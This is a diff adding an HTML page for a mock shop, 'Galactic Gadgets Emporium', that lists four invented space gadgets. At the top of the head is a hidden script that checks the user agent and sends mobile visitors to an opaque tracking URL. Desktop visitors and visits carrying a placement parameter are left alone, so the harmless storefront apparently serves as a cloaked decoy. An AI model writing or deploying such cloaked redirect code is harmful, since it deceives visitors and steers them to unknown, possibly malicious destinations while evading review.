@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Gadgets Emporium</title>
+    <style>
+        body {
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(135deg, #0c0c2c, #1a1a4a);
+            color: #e0e0ff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #00ffff;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            background-color: rgba(0, 255, 255, 0.1);
+            padding: 10px;
+        }
+        nav a {
+            color: #00ffff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s;
+        }
+        .product-card:hover {
+            transform: scale(1.05);
+        }
+        .product-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 5px;
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.7);
+            text-align: center;
+            padding: 20px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Gadgets Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main class="product-grid">
+        <div class="product-card">
+            <img src="https://picsum.photos/200/300?random=1" alt="Quantum Communicator" class="product-image">
+            <h2>Quantum Communicator</h2>
+            <p>Instant messaging across galaxies!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product-card">
+            <img src="https://picsum.photos/200/300?random=2" alt="Nebula Navigator" class="product-image">
+            <h2>Nebula Navigator</h2>
+            <p>Never get lost in space again!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product-card">
+            <img src="https://picsum.photos/200/300?random=3" alt="Antigravity Boots" class="product-image">
+            <h2>Antigravity Boots</h2>
+            <p>Walk on walls and ceilings!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product-card">
+            <img src="https://picsum.photos/200/300?random=4" alt="Time Dilation Watch" class="product-image">
+            <h2>Time Dilation Watch</h2>
+            <p>Experience relativity firsthand!</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
